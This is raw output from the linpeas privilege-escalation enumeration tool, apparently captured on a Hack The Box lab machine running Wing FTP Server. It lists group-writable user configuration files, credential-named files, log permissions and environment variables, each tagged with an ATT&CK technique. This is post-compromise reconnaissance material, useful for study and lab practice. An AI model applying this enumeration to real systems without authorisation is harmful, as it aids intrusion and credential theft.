/opt/wftpserver/webadmin/webfonts/fa-brands-400.ttf
/opt/wftpserver/webadmin/webfonts/fa-brands-400.woff
/opt/wftpserver/webadmin/webfonts/fa-brands-400.woff2
/opt/wftpserver/webadmin/webfonts/fa-regular-400.eot
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webclient
/opt/wftpserver/webclient/audioplayer.html
/opt/wftpserver/webclient/bookmark.html
/opt/wftpserver/webclient/changepass.html
/opt/wftpserver/webclient/chdir.html
/opt/wftpserver/webclient/checkcode.html
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webclient/css/allfonts.min.css
/opt/wftpserver/webclient/css/bulma.min.css
/opt/wftpserver/webclient/css/style.css
/opt/wftpserver/webclient/cut.html
/opt/wftpserver/webclient/dir.html
/opt/wftpserver/webclient/downloadfolder.html
/opt/wftpserver/webclient/downloadpass.html
/opt/wftpserver/webclient/ed2kurl.html
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webclient/edit_area/autocompletion.js
/opt/wftpserver/webclient/edit_area/edit_area.css
/opt/wftpserver/webclient/edit_area/edit_area_full.js
/opt/wftpserver/webclient/edit_area/edit_area_functions.js
/opt/wftpserver/webclient/edit_area/edit_area.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webclient/edit_area/langs/big5.js
/opt/wftpserver/webclient/edit_area/langs/ch.js
/opt/wftpserver/webclient/edit_area/langs/cs.js
/opt/wftpserver/webclient/edit_area/langs/de.js
/opt/wftpserver/webclient/edit_area/langs/dk.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webclient/edit_area/manage_area.js
/opt/wftpserver/webclient/edit_area/regexp.js
/opt/wftpserver/webclient/edit_area/reg_syntax
/opt/wftpserver/webclient/edit_area/reg_syntax/c.js
/opt/wftpserver/webclient/edit_area/reg_syntax/cpp.js
/opt/wftpserver/webclient/edit_area/reg_syntax/cs.js
/opt/wftpserver/webclient/edit_area/reg_syntax/css.js
/opt/wftpserver/webclient/edit_area/reg_syntax/go.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webclient/edit_area/reg_syntax.js
/opt/wftpserver/webclient/edit_area/reg_syntax/js.js
/opt/wftpserver/webclient/edit_area/reg_syntax/lua.js
/opt/wftpserver/webclient/edit_area/reg_syntax/pas.js
/opt/wftpserver/webclient/edit_area/reg_syntax/perl.js
/opt/wftpserver/webclient/edit_area/reg_syntax/php.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
[1;34m╔══════════╣ [1;32mInteresting GROUP writable files (not in Home) (max 200) [1;90m(T1574.009,T1574.010)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
[0m  Group [1;32mwingftp:
[0m/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/ssh_host_key
/opt/wftpserver/Log/Admin/Admin-2026-1-12.log
/opt/wftpserver/Log/Admin/Admin-2026-1-14.log
/opt/wftpserver/Log/Admin/Admin-2026-2-9.log
/opt/wftpserver/Log/Admin/Admin-2026-5-11.log
/opt/wftpserver/Log/Admin/Admin-2026-1-22.log
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/Log/Domains/1/2026-5-11.log.zip
/opt/wftpserver/Log/Domains/1/2026-6-14.log
/opt/wftpserver/Log/Domains/1/2026-2-9.log.zip
/opt/wftpserver/Log/System/System-2026-2-9.log
/opt/wftpserver/Log/System/System-2026-5-11.log
/opt/wftpserver/Log/System/System-2026-6-14.log
/tmp/linpeas[1;31m.sh[0m
/tmp/linpeas.txt


[1;34m╔══════════╣ [1;32mWritable root-owned executables I can modify (max 200) [1;90m(T1574.009,T1574.010)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
[0m[1;90mWritable root-owned executables Not Found
[0m


[1;34m                            ╔═════════════════════════╗
════════════════════════════╣ [1;32mOther Interesting Files[1;34m ╠════════════════════════════
[1;34m                            ╚═════════════════════════╝[0m
[1;34m╔══════════╣ [1;32m.sh files in path [1;90m(T1574.007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
[0m/usr/bin[1;32m/gettext.sh[0m

[1;34m╔══════════╣ [1;32mExecutable files potentially added by user (limit 70) [1;90m(T1083)
[0m2026-06-14+02:49:55.3913050020 /opt/wftpserver/Data/1/users/anonymous.xml
2026-06-14+02:45:55.2753105740 /opt/wftpserver/Log/audit_db
2026-06-14+02:44:54.3633119870 /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
2026-01-22+04:41:51.7071699300 /usr/local/sbin/laurel
2026-01-08+09:28:54.0999949510 /etc/X11/Xsession.d/99-vmware_vmware-user
2026-01-08+09:28:48.4039950830 /usr/sbin/mount.vmhgfs
2026-01-08+09:28:48.1679950880 /etc/vmware-tools/vgauth.conf
2026-01-08+09:28:48.1639950880 /usr/lib/vmware-tools/bin32/vmware-xferlogs
2026-01-08+09:28:48.1639950880 /usr/lib/vmware-tools/bin32/appLoader
2026-01-08+09:28:48.1599950890 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
2026-01-08+09:28:48.1599950890 /usr/lib/vmware-tools/bin32/configure-gtk.sh
2026-01-08+09:28:48.1599950890 /usr/lib/vmware-tools/bin32/appLoader-av0
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libvmbackup.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libtimeSync.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libresolutionKMS.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libpowerOps.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libguestInfo.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libdeployPkgPlugin.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libautoUpgrade.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/vmusr/libresolutionSet.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/vmusr/libdndcp.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/vmusr/libdesktopEvents.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/common/libvix.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/common/libhgfsServer.so
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin64/vmtoolsd
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin32/vmware-rpctool
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin32/vmware-hgfsmounter
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin32/vmware-checkvm
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/vmware-xferlogs
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/configure-gtk.sh
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/appLoader-av0
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/appLoader
2026-01-08+09:28:47.6399951010 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
2026-01-08+09:28:47.6359951010 /usr/lib/vmware-tools/configurator/XOrg/7.6/vmmouse_detect
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/sbin64/vmware-rpctool
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/sbin64/vmware-hgfsmounter
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/sbin64/vmware-checkvm
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/configurator/XOrg/7.6_64/vmmouse_detect
2026-01-08+09:28:47.1719951110 /usr/bin/vmware-config-tools.pl
2026-01-08+09:28:47.1719951110 /etc/init.d/vmware-tools
2026-01-08+09:28:47.1639951120 /usr/bin/vmware-uninstall-tools.pl
2026-01-08+09:28:47.1639951120 /usr/bin/vm-support
2026-01-08+09:28:47.1519951120 /etc/vmware-tools/messages/de/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/hgfsUsability.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/desktopEvents.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/hgfsUsability.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/desktopEvents.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/hgfsUsability.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/desktopEvents.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/hgfsUsability.vmsg

[1;34m╔══════════╣ [1;32mUnexpected in /opt (usually empty) [1;90m(T1083)
[0mtotal 16
drwxr-xr-x  4 root    root    4096 Feb  9 08:19 .
drwxr-xr-x 18 root    root    4096 Feb  9 08:19 ..
drwxr-x---  4 root    wacky   4096 Jan 12 08:43 backup_clients
drwxr-x---  9 wingftp wingftp 4096 Jun 14 02:44 wftpserver

[1;34m╔══════════╣ [1;32mUnexpected in root [1;90m(T1083)
[0m[1;31m/vmlinuz[0m
[1;31m/initrd.img.old[0m
[1;31m/vmlinuz.old[0m
[1;31m/initrd.img[0m

[1;34m╔══════════╣ [1;32mModified interesting files in the last 5mins (limit 100) [1;90m(T1083)
[0m[1;31m/opt/wftpserver/Data/1/users[0m/anonymous.xml
/var/log/laurel/audit.log
/var/log/laurel/audit.log.2
/var/log/laurel/audit.log.3
/var/log/laurel/audit.log.1
/var/log/journal/d7191fe43d42493b8eff7c566ecfc9a6/user-1000.journal
/var/log/journal/d7191fe43d42493b8eff7c566ecfc9a6/system.journal

[1;34m╔══════════╣ [1;32mSyslog configuration (limit 50) [1;90m(T1070.002)
[0m[1;90msyslog configuration Not Found
[0m[1;34m╔══════════╣ [1;32mAuditd configuration (limit 50) [1;90m(T1070.002)
[0m[1;90mauditd configuration Not Found
[0m[1;34m╔══════════╣ [1;32mLog files with potentially weak perms (limit 50) [1;90m(T1070.002)
[0m[1;31m    58287    756 -rw-------   1 _laurel  _laurel    773998 Jun 14 02:54 /var/log/laurel/audit.log[0m
[1;31m    21515   4884 -rw-------   1 _laurel  _laurel   5000717 Feb  9 05:14 /var/log/laurel/audit.log.14[0m
[1;31m    21553   4884 -rw-------   1 _laurel  _laurel   5000774 Feb  9 05:14 /var/log/laurel/audit.log.12[0m
[1;31m    21561   4888 -rw-------   1 _laurel  _laurel   5001396 Jan 22 05:13 /var/log/laurel/audit.log.22[0m
[1;31m    21563   4884 -rw-------   1 _laurel  _laurel   5000725 Jan 22 05:13 /var/log/laurel/audit.log.21[0m
[1;31m    21557   4884 -rw-------   1 _laurel  _laurel   5000516 Feb  9 09:37 /var/log/laurel/audit.log.9[0m
[1;31m    58257   4884 -rw-------   1 _laurel  _laurel   5000030 Feb  9 09:37 /var/log/laurel/audit.log.8[0m
[1;31m    21352   4884 -rw-------   1 _laurel  _laurel   5000454 Jan 22 05:13 /var/log/laurel/audit.log.19[0m
[1;31m    21562   4884 -rw-------   1 _laurel  _laurel   5000963 Jan 22 05:14 /var/log/laurel/audit.log.17[0m
[1;31m    58263   4884 -rw-------   1 _laurel  _laurel   5001091 Feb  9 09:37 /var/log/laurel/audit.log.5[0m
[1;31m    58284   4888 -rw-------   1 _laurel  _laurel   5001613 Jun 14 02:53 /var/log/laurel/audit.log.2[0m
[1;31m    58259   4888 -rw-------   1 _laurel  _laurel   5001588 Jun 14 02:52 /var/log/laurel/audit.log.3[0m
[1;31m    58286   4884 -rw-------   1 _laurel  _laurel   5000836 Jun 14 02:54 /var/log/laurel/audit.log.1[0m
[1;31m    21555   4888 -rw-------   1 _laurel  _laurel   5001414 Feb  9 05:14 /var/log/laurel/audit.log.11[0m
[1;31m    58261   4888 -rw-------   1 _laurel  _laurel   5001319 Feb  9 09:37 /var/log/laurel/audit.log.7[0m
[1;31m    21556   4884 -rw-------   1 _laurel  _laurel   5000017 Feb  9 05:14 /var/log/laurel/audit.log.10[0m
[1;31m    21559   4884 -rw-------   1 _laurel  _laurel   5000125 Jan 22 05:12 /var/log/laurel/audit.log.23[0m
[1;31m    58262   4884 -rw-------   1 _laurel  _laurel   5001163 Feb  9 09:37 /var/log/laurel/audit.log.6[0m
[1;31m    58264   4884 -rw-------   1 _laurel  _laurel   5000608 May 11 09:16 /var/log/laurel/audit.log.4[0m
[1;31m    19322   4884 -rw-------   1 _laurel  _laurel   5000929 Feb  9 05:02 /var/log/laurel/audit.log.15[0m
[1;31m    21560   4884 -rw-------   1 _laurel  _laurel   5000044 Jan 22 05:13 /var/log/laurel/audit.log.18[0m
[1;31m    21564   4884 -rw-------   1 _laurel  _laurel   5000261 Jan 22 05:16 /var/log/laurel/audit.log.16[0m
[1;31m    21549   4884 -rw-------   1 _laurel  _laurel   5000761 Feb  9 05:14 /var/log/laurel/audit.log.13[0m
[1;31m    21316   4888 -rw-------   1 _laurel  _laurel   5001246 Jan 22 05:12 /var/log/laurel/audit.log.24[0m
[1;31m    16587   4884 -rw-------   1 _laurel  _laurel   5000796 Jan 22 05:12 /var/log/laurel/audit.log.25[0m
[1;31m    21119   4884 -rw-------   1 _laurel  _laurel   5000769 Jan 22 05:13 /var/log/laurel/audit.log.20[0m
[1;31m    58267      4 -rw-r-----   1 root     adm           847 Feb  9 05:14 /var/log/apt/term.log.1.gz[0m
[1;31m    58266      0 -rw-r-----   1 root     adm             0 May 11 09:16 /var/log/apt/term.log[0m

[1;34m╔══════════╣ [1;32mFiles inside /opt/wingftp (limit 20) [1;90m(T1083)
[0m
[1;34m╔══════════╣ [1;32mFiles inside others home (limit 20) [1;90m(T1552.001)
[0m/var/www/wingdata.htb/index.html
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js.map
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.min.js
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css.map
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.js
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.slim.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.js
/var/www/wingdata.htb/assets/js/imagesloaded.js
/var/www/wingdata.htb/assets/js/isotope.js
/var/www/wingdata.htb/assets/js/templatemo-custom.js
/var/www/wingdata.htb/assets/js/owl-carousel.js
/var/www/wingdata.htb/assets/js/animation.js
/var/www/wingdata.htb/assets/js/tabs.js
/var/www/wingdata.htb/assets/fonts/slick.svg
/var/www/wingdata.htb/assets/fonts/slick.ttf

[1;34m╔══════════╣ [1;32mSearching installed mail applications [1;90m(T1114.001)
[0m
[1;34m╔══════════╣ [1;32mMails (limit 50) [1;90m(T1114.001)
[0m
[1;34m╔══════════╣ [1;32mBackup files (limited 100) [1;90m(T1552.001)
[0m-rwxr-xr-x 1 root root 2569 May 10  2023 /usr/libexec/dpkg/dpkg-db-[1;31mbackup[0m
-rw-r--r-- 1 root root 13581 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/__pycache__/test_[1;31mbackup[0m.cpython-312.opt-1.pyc
-rw-r--r-- 1 root root 13581 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/__pycache__/test_[1;31mbackup[0m.cpython-312.pyc
-rw-r--r-- 1 root root 13581 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/__pycache__/test_[1;31mbackup[0m.cpython-312.opt-2.pyc
-rw-r--r-- 1 root root 5767 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/test_[1;31mbackup[0m.py
-rw-r--r-- 1 root root 194817 Oct  9  2020 /usr/share/doc/x11-common/changelog.Debian[1;31m.old[0m.gz
-rw-r--r-- 1 root root 438702 Feb 15  2023 /usr/share/doc/manpages/Changes[1;31m.old[0m.gz
-rw-r--r-- 1 root root 147 Mar 26  2023 /usr/lib/systemd/system/dpkg-db-[1;31mbackup[0m.service
-rw-r--r-- 1 root root 138 Mar 26  2023 /usr/lib/systemd/system/dpkg-db-[1;31mbackup[0m.timer
-rw-r--r-- 1 root root 14257 Dec 30 17:20 /usr/lib/modules/6.1.0-42-amd64/kernel/drivers/net/team/team_mode_active[1;31mbackup[0m.ko
-rwxr-xr-x 1 root root 38984 Jan  8 09:28 /usr/lib/vmware-tools/plugins64/vmsvc/libvm[1;31mbackup[0m.so
-rwxr-xr-x 1 root root 34176 Jan  8 09:28 /usr/lib/vmware-tools/plugins32/vmsvc/libvm[1;31mbackup[0m.so
-rw-r--r-- 1 root root 0 Nov  2  2025 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-[1;31mbackup[0m.timer
-rw-r--r-- 1 root root 61 Nov  2  2025 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-[1;31mbackup[0m.timer.dsh-also

[1;34m╔══════════╣ [1;32mSearching tables inside readable .db/.sql/.sqlite files (limit 100) [1;90m(T1005)
[0mFound /var/lib/apt/listchanges[1;31m.db[0m: Berkeley DB (Hash, version 9, native byte-order)


[1;34m╔══════════╣ [1;32mWeb files?(output limit) [1;90m(T1005)
[0m/var/www/:
total 16K
drwxr-xr-x  4 root     root     4.0K Feb  9 08:19 .
drwxr-xr-x 12 root     root     4.0K Feb  9 08:19 ..
drwxr-xr-x  2 root     root     4.0K Feb  9 08:19 html
drwxr-xr-x  4 www-data www-data 4.0K Feb  9 08:19 wingdata.htb

/var/www/html:
total 8.0K
drwxr-xr-x 2 root root 4.0K Feb  9 08:19 .

[1;34m╔══════════╣ [1;32mAll relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) [1;90m(T1564.001)
[0m-rw-r--r-- 1 root root 0 Jun 14 02:44 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 220 Jun  6  2025 /etc/skel/.bash_logout
-rw------- 1 root root 0 Nov  2  2025 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Mar 14  2023 /usr/share/dictionaries-common/site-elisp/.nosearch

[1;34m╔══════════╣ [1;32mReadable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) [1;90m(T1552.001)
[0m-rwxrwxrwx 1 wingftp wingftp 1063041 Jun 14 02:33 /tmp/linpeas.sh
-rw-rw-rw- 1 wingftp wingftp 356772 Jun 14 02:54 /tmp/linpeas.txt

[1;34m╔══════════╣ [1;32mSearching passwords in history files [1;90m(T1552.001)
[0m/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:    [1;31m@[0mclassmethod
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:    [1;31m@[0mclassmethod
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        cls.[1;31mroot[0m = tk.Tk()
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        cls.[1;31mroot[0m.withdraw()
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        self.text = text = TextWrapper(self.[1;31mroot[0m)
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:    [1;31m@[0mclassmethod
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        cls.[1;31mroot[0m.destroy()
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        del cls.[1;31mroot[0m

[1;34m╔══════════╣ [1;32mSearching *password* or *credential* files in home (limit 70) [1;90m(T1552.001)
[0m/etc/pam.d/common-[1;31mpassword[0m
/opt/wftpserver/webadmin/images/[1;31mpassword[0m.gif
/opt/wftpserver/webclient/images/[1;31mpassword[0m.gif
/opt/wftpserver/webclient/images/[1;31mpassword[0m.png
/opt/wftpserver/wftp_default_ssh.key
/opt/wftpserver/wftp_default_ssl.key
/usr/bin/systemd-ask-[1;31mpassword[0m
/usr/bin/systemd-tty-ask-[1;31mpassword[0m-agent
/usr/lib/grub/i386-pc/legacy_[1;31mpassword[0m_test.mod
/usr/lib/grub/i386-pc/[1;31mpassword[0m.mod
/usr/lib/grub/i386-pc/[1;31mpassword[0m_pbkdf2.mod
/usr/lib/systemd/systemd-reply-[1;31mpassword[0m
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-[1;31mpassword[0m-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-[1;31mpassword[0m-console.path
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-console.path
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-console.service
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-wall.path
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-wall.service
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/share/doc/apache2-doc/manual/de/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/en/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/es/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/fr/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/ja/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/ko/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/pt-br/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/ru/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/tr/misc/[1;31mpassword[0m_encryptions.html
/usr/share/doc/apache2-doc/manual/zh-cn/misc/[1;31mpassword[0m_encryptions.html
/usr/share/man/man1/systemd-ask-[1;31mpassword[0m.1.gz
/usr/share/man/man1/systemd-tty-ask-[1;31mpassword[0m-agent.1.gz
/usr/share/man/man7/[1;31mcredential[0ms.7.gz
/usr/share/man/man7/systemd.system-[1;31mcredential[0ms.7.gz
/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-console.path.8.gz
/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-console.service.8.gz
/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-wall.path.8.gz
/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-wall.service.8.gz
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/share/pam/common-[1;31mpassword[0m.md5sums
/var/cache/debconf/[1;31mpassword[0ms.dat
/var/lib/pam/[1;31mpassword[0m

[1;34m╔══════════╣ [1;32mChecking for TTY (sudo/su) passwords in audit logs [1;90m(T1552.001)
[0m
[1;34m╔══════════╣ [1;32mChecking for TTY (sudo/su) passwords in audit logs [1;90m(T1083)
[0m
[1;34m╔══════════╣ [1;32mSearching passwords inside logs (limit 70) [1;90m(T1552.001)
[0m
[1;34m╔══════════╣ [1;32mChecking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars [1;90m(T1552.007,T1082)
[0m_=
HOME=/opt/wingftp
LANG=en_US.UTF-8
LOGNAME=wingftp
OLDPWD=/opt/wftpserver
PIDFILE=/opt/wftpserver/pid-wftpserver.pid
PWD=/opt/wftpserver
PWD=/tmp
SHELL=/bin/bash
SHLVL=1
SHLVL=2
USER=wingftp
_=/usr/bin/bash
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/timeout


[1;34m                                ╔════════════════╗
════════════════════════════════╣ [1;32mAPI Keys Regex[1;34m ╠════════════════════════════════
[1;34m                                ╚════════════════╝[0m
Regexes to search for API keys aren't activated, use param '-r' 


